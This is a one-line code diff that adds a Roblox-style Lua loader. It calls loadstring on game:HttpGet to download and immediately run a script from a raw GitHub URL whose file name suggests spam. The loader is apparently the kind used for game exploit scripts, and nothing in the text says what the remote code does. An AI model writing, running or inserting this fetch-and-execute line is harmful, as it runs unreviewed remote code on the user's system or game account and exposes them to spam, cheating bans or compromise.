@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/apple-ipad-original-spam4-2ezei7yvh09gcs.lua"))()
